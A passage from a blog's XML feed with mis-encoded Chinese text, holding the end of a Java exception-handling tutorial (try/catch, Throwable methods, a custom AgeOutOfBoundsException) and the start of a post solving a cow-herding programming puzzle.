é‡Œé¢å»æ‰§è¡Œ</li><li>æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œç¨‹åºè¿˜å¯ä»¥ç»§ç»­å¾€ä¸‹æ‰§è¡Œ</li></ul></li><li><p>ç¤ºä¾‹ä»£ç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionDemo01</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å¼€å§‹"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ç»“æŸ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¿™é‡Œèƒ½å¤Ÿè®¿é—®åˆ°å—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ArrayIndexOutOfBoundsException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä½ è®¿é—®çš„æ•°ç»„ç´¢å¼•ä¸å­˜åœ¨ï¼Œè¯·å›å»ä¿®æ”¹ä¸ºæ­£ç¡®çš„ç´¢å¼•"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>æ³¨æ„</p><ol><li><p>å¦‚æœ try ä¸­æ²¡æœ‰é‡åˆ°é—®é¢˜ï¼Œæ€ä¹ˆæ‰§è¡Œï¼Ÿ</p><p>ä¼šæŠŠtryä¸­æ‰€æœ‰çš„ä»£ç å…¨éƒ¨æ‰§è¡Œå®Œæ¯•,ä¸ä¼šæ‰§è¡Œcatché‡Œé¢çš„ä»£ç </p></li><li><p>å¦‚æœ try ä¸­é‡åˆ°äº†é—®é¢˜ï¼Œé‚£ä¹ˆ try ä¸‹é¢çš„ä»£ç è¿˜ä¼šæ‰§è¡Œå—ï¼Ÿ</p><p>é‚£ä¹ˆç›´æ¥è·³è½¬åˆ°å¯¹åº”çš„catchè¯­å¥ä¸­,tryä¸‹é¢çš„ä»£ç å°±ä¸ä¼šå†æ‰§è¡Œäº†<br>å½“catché‡Œé¢çš„è¯­å¥å…¨éƒ¨æ‰§è¡Œå®Œæ¯•,è¡¨ç¤ºæ•´ä¸ªä½“ç³»å…¨éƒ¨æ‰§è¡Œå®Œå…¨,ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç </p></li><li><p>å¦‚æœå‡ºç°çš„é—®é¢˜æ²¡æœ‰è¢«æ•è·ï¼Œé‚£ä¹ˆç¨‹åºå¦‚ä½•è¿è¡Œï¼Ÿ</p><p>é‚£ä¹ˆtryâ€¦catchå°±ç›¸å½“äºæ²¡æœ‰å†™.é‚£ä¹ˆä¹Ÿå°±æ˜¯è‡ªå·±æ²¡æœ‰å¤„ç†.<br>é»˜è®¤äº¤ç»™è™šæ‹Ÿæœºå¤„ç†.</p></li><li><p>åŒæ—¶æœ‰å¯èƒ½å‡ºç°å¤šä¸ªå¼‚å¸¸æ€ä¹ˆå¤„ç†ï¼Ÿ</p><p>å‡ºç°å¤šä¸ªå¼‚å¸¸,é‚£ä¹ˆå°±å†™å¤šä¸ªcatchå°±å¯ä»¥äº†.<br>æ³¨æ„ç‚¹:å¦‚æœå¤šä¸ªå¼‚å¸¸ä¹‹é—´å­˜åœ¨å­çˆ¶ç±»å…³ç³».é‚£ä¹ˆçˆ¶ç±»ä¸€å®šè¦å†™åœ¨ä¸‹é¢</p></li></ol></li></ul><h4 id="Throwableæˆå‘˜æ–¹æ³•"><a href="#Throwableæˆå‘˜æ–¹æ³•" class="headerlink" title="Throwableæˆå‘˜æ–¹æ³•"></a>Throwableæˆå‘˜æ–¹æ³•</h4><ul><li>å¸¸ç”¨æ–¹æ³•</li></ul><table><thead><tr><th>æ–¹æ³•å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>public String getMessage()</td><td>è¿”å›æ­¤ throwable çš„è¯¦ç»†æ¶ˆæ¯å­—ç¬¦ä¸²</td></tr><tr><td>public String toString()</td><td>è¿”å›æ­¤å¯æŠ›å‡ºçš„ç®€çŸ­æè¿°</td></tr><tr><td>public void printStackTrace()</td><td>æŠŠå¼‚å¸¸çš„é”™è¯¯ä¿¡æ¯è¾“å‡ºåœ¨æ§åˆ¶å°</td></tr></tbody></table><ul><li>ä»£ç å®ä¾‹ï¼š</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionDemo02</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å¼€å§‹"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ç»“æŸ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//new ArrayIndexOutOfBoundsException();</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¿™é‡Œèƒ½å¤Ÿè®¿é—®åˆ°å—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ArrayIndexOutOfBoundsException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//new ArrayIndexOutOfBoundsException();</span><span class="token comment">//            e.printStackTrace();</span>            <span class="token comment">//public String getMessage():è¿”å›æ­¤ throwable çš„è¯¦ç»†æ¶ˆæ¯å­—ç¬¦ä¸²</span><span class="token comment">//            System.out.println(e.getMessage());</span>            <span class="token comment">//Index 3 out of bounds for length 3</span>            <span class="token comment">//public String toString():è¿”å›æ­¤å¯æŠ›å‡ºçš„ç®€çŸ­æè¿°</span><span class="token comment">//            System.out.println(e.toString());</span>            <span class="token comment">//java.lang.ArrayIndexOutOfBoundsException: Index 3 out of bounds for length 3</span>            <span class="token comment">//public void printStackTrace():æŠŠå¼‚å¸¸çš„é”™è¯¯ä¿¡æ¯è¾“å‡ºåœ¨æ§åˆ¶å°</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//            java.lang.ArrayIndexOutOfBoundsException: Index 3 out of bounds for length 3</span><span class="token comment">//            at com.itheima_02.ExceptionDemo02.method(ExceptionDemo02.java:18)</span><span class="token comment">//            at com.itheima_02.ExceptionDemo02.main(ExceptionDemo02.java:11)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è‡ªå®šä¹‰å¼‚å¸¸"><a href="#è‡ªå®šä¹‰å¼‚å¸¸" class="headerlink" title="è‡ªå®šä¹‰å¼‚å¸¸"></a>è‡ªå®šä¹‰å¼‚å¸¸</h4><ul><li><p>è‡ªå®šä¹‰å¼‚å¸¸æ¦‚è¿°</p><p>å½“Javaä¸­æä¾›çš„å¼‚å¸¸ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚æ—¶,æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰å¼‚å¸¸</p></li><li><p>å®ç°æ­¥éª¤</p><ol><li>å®šä¹‰å¼‚å¸¸ç±»</li><li>å†™ç»§æ‰¿å…³ç³»</li><li>æä¾›ç©ºå‚æ„é€ </li><li>æä¾›å¸¦å‚æ„é€ </li></ol></li><li><p>ä»£ç å®ç°</p><p>å­¦ç”Ÿä¿¡æ¯å½•å…¥ï¼Œè¦å¯¹å¹´é¾„è¿›è¡Œåˆ¤æ–­ã€‚</p><p>å¼‚å¸¸ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgeOutOfBoundsException</span> <span class="token keyword">extends</span> <span class="token class-name">RuntimeException</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">AgeOutOfBoundsException</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>                  <span class="token comment">//æä¾›ç©ºå‚æ„é€ </span>    <span class="token keyword">public</span> <span class="token class-name">AgeOutOfBoundsException</span><span class="token punctuation">(</span><span class="token class-name">String</span> message<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment">//æä¾›å¸¦å‚æ„é€ </span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å­¦ç”Ÿç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>age <span class="token operator">&gt;=</span> <span class="token number">18</span> <span class="token operator">&amp;&amp;</span> age <span class="token operator">&lt;=</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token comment">//å¦‚æœJavaä¸­æä¾›çš„å¼‚å¸¸ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚,æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„å¼‚å¸¸</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AgeOutOfBoundsException</span><span class="token punctuation">(</span><span class="token string">"å¹´é¾„è¶…å‡ºäº†èŒƒå›´"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>age <span class="token operator">&gt;=</span> <span class="token number">18</span> <span class="token operator">&amp;&amp;</span> age <span class="token operator">&lt;=</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token comment">//å¦‚æœJavaä¸­æä¾›çš„å¼‚å¸¸ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚,æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„å¼‚å¸¸</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AgeOutOfBoundsException</span><span class="token punctuation">(</span><span class="token string">"å¹´é¾„è¶…å‡ºäº†èŒƒå›´"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Student{"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token char">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExceptionDemo12</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// é”®ç›˜å½•å…¥å­¦ç”Ÿçš„å§“åå’Œå¹´é¾„,å…¶ä¸­å¹´é¾„ä¸º 18 - 25å²,</span>        <span class="token comment">// è¶…å‡ºè¿™ä¸ªèŒƒå›´æ˜¯å¼‚å¸¸æ•°æ®ä¸èƒ½èµ‹å€¼.éœ€è¦é‡æ–°å½•å…¥,ä¸€ç›´å½•åˆ°æ­£ç¡®ä¸ºæ­¢ã€‚</span>        <span class="token class-name">Student</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Scanner</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥å§“å"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> name <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥å¹´é¾„"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">String</span> ageStr <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">try</span> <span class="token punctuation">{</span>               <span class="token keyword">int</span> age <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>ageStr<span class="token punctuation">)</span><span class="token punctuation">;</span>               s<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">break</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NumberFormatException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥ä¸€ä¸ªæ•´æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">continue</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">AgeOutOfBoundsException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥ä¸€ä¸ªç¬¦åˆèŒƒå›´çš„å¹´é¾„"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">continue</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>       <span class="token punctuation">}</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JavaSE </tag>
            
            <tag> JavaåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¯æ—¥ä¸€é¢˜ï¼ˆä¸‰ï¼‰</title>
      <link href="/2022/04/02/mei-ri-yi-ti-san/"/>
      <url>/2022/04/02/mei-ri-yi-ti-san/</url>
      
        <content type="html"><![CDATA[<p>åˆ†ç±»è®¨è®ºä¸“é¢˜</p><h2 id="å›°ç‰›æ”¾ç‰§"><a href="#å›°ç‰›æ”¾ç‰§" class="headerlink" title="å›°ç‰›æ”¾ç‰§"></a>å›°ç‰›æ”¾ç‰§</h2><p>Farmer John çš„ä¸‰å¤´è·å¥–å¥¶ç‰› Bessieã€Elsie å’Œ Mildredï¼Œæ€»æ˜¯ä¼šè¿·è·¯èµ°åˆ°å†œåœºä¸Šé¥è¿œçš„åœ°æ–¹å»ï¼</p><p>ä»–éœ€è¦ä½ å¸®åŠ©å°†å¥¹ä»¬ä¸€èµ·èµ¶å›æ¥ã€‚</p><p>å†œåœºçš„è‰åœ°å¤§ä½“æ˜¯ä¸€å—ç‹­é•¿çš„åŒºåŸŸâ€”â€”æˆ‘ä»¬å¯ä»¥å°†å…¶æƒ³è±¡æˆä¸€æ¡æ•°è½´ï¼Œå¥¶ç‰›å¯ä»¥å æ®æ•°è½´ä¸Šçš„ä»»æ„æ•´æ•°ä½ç½®ã€‚</p><p>è¿™ $3$ å¤´å¥¶ç‰›ç°åœ¨æ­£ä½äºä¸åŒçš„æ•´æ•°ä½ç½®ï¼ŒFarmer John æƒ³è¦ç§»åŠ¨å¥¹ä»¬ï¼Œä½¿å¾—å¥¹ä»¬å æ®ä¸‰ä¸ªç›¸é‚»çš„ä½ç½®ï¼ˆä¾‹å¦‚ï¼Œä½ç½® $6ã€7ã€8$ï¼‰ã€‚</p><p>ä¸å¹¸çš„æ˜¯ï¼Œå¥¶ç‰›ä»¬ç°åœ¨å¾ˆå›°ï¼ŒFarmer John è¦è®©å¥¹ä»¬é›†ä¸­ç²¾åŠ›å¬ä»å‘½ä»¤ç§»åŠ¨å¹¶ä¸å®¹æ˜“ã€‚</p><p>ä»»æ„æ—¶åˆ»ï¼Œä»–åªèƒ½ä½¿å¾—ä¸€å¤´å¤„åœ¨â€œç«¯ç‚¹â€ï¼ˆåœ¨æ‰€æœ‰å¥¶ç‰›ä¸­ä½ç½®æœ€å°æˆ–æœ€å¤§ï¼‰ä½ç½®çš„å¥¶ç‰›ç§»åŠ¨ã€‚</p><p>å½“ä»–ç§»åŠ¨å¥¶ç‰›æ—¶ï¼Œä»–å¯ä»¥å‘½ä»¤å¥¹èµ°åˆ°ä»»æ„ä¸€ä¸ªæœªè¢«å ç”¨çš„æ•´æ•°ä½ç½®ï¼Œåªè¦åœ¨æ–°çš„ä½ç½®ä¸Šå¥¹ä¸å†æ˜¯ä¸€ä¸ªç«¯ç‚¹ã€‚</p><p>å¯ä»¥çœ‹åˆ°éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè¿™æ ·çš„ç§»åŠ¨å¯ä»¥ä½¿å¥¶ç‰›ä»¬è¶‹å‘è¶Šæ¥è¶Šè¿‘ã€‚</p><p>è¯·æ±‚å‡ºä½¿å¾—å¥¶ç‰›ä»¬é›†ä¸­åˆ°ç›¸é‚»ä½ç½®æ‰€è¿›è¡Œçš„ç§»åŠ¨æ¬¡æ•°çš„æœ€å°å’Œæœ€å¤§å¯èƒ½å€¼ã€‚</p><h4 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥åŒ…å«ä¸€è¡Œï¼ŒåŒ…æ‹¬ä¸‰ä¸ªç©ºæ ¼åˆ†éš”çš„æ•´æ•°ï¼Œä¸º Bessieã€Elsie å’Œ Mildred çš„ä½ç½®ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºçš„ç¬¬ä¸€è¡ŒåŒ…å« Farmer John éœ€è¦å°†å¥¶ç‰›ä»¬èšé›†èµ·æ¥æ‰€éœ€è¿›è¡Œçš„æœ€å°ç§»åŠ¨æ¬¡æ•°ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å«ä»–å°†å¥¶ç‰›èšé›†èµ·æ¥èƒ½å¤Ÿè¿›è¡Œçš„æœ€å¤§ç§»åŠ¨æ¬¡æ•°ã€‚</p><h4 id="æ•°æ®èŒƒå›´"><a href="#æ•°æ®èŒƒå›´" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>æ¯ä¸ªä½ç½®å‡ä¸ºä¸€ä¸ªèŒƒå›´ $1â€¦10^9$ å†…çš„æ•´æ•°ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">4 7 9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š"><a href="#æ ·ä¾‹è§£é‡Š" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>æœ€å°ç§»åŠ¨æ¬¡æ•°ä¸º $1$â€”â€”å¦‚æœ Farmer John å°†ä½ç½® $4$ çš„å¥¶ç‰›ç§»åŠ¨åˆ°ä½ç½® $8$ï¼Œé‚£ä¹ˆå¥¶ç‰›ä»¬å°±å¤„åœ¨è¿ç»­çš„ä½ç½® $7ã€8ã€9$ã€‚</p><p>æœ€å¤§ç§»åŠ¨æ¬¡æ•°ä¸º $2$ã€‚ä¾‹å¦‚ï¼Œä½ç½® $9$ çš„å¥¶ç‰›å¯ä»¥è¢«ç§»åŠ¨åˆ°ä½ç½® $6$ï¼Œç„¶åä½ç½® $7$ çš„å¥¶ç‰›å¯ä»¥è¢«ç§»åŠ¨åˆ°ä½ç½® $5$ã€‚</p><h4 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p>è´ªå¿ƒ+åˆ†ç±»è®¨è®º</p><p><strong>æœ€å°‘æ¬¡æ•°:</strong></p><p>æƒ…å†µ1: $3$ å¤´ç‰›å·²ç»è¿ç»­ï¼Œ å³<code>----abc-----</code>, ç›´æ¥è¾“å‡º $0$</p><p>æƒ…å†µ2: a, bä¸¤å¤´ç‰›é—´éš” $1$ï¼Œ å³<code>---a-b----c-----</code>, æ­¤æ—¶åªè¦æŠŠcç§»åŠ¨åˆ°aã€bä¸­é—´å³å¯ï¼Œè¾“å‡º $1$</p><p>æƒ…å†µ3: b, cä¸¤å¤´ç‰›é—´éš” $1$ï¼Œ å³<code>---a-----b-c-----</code>, 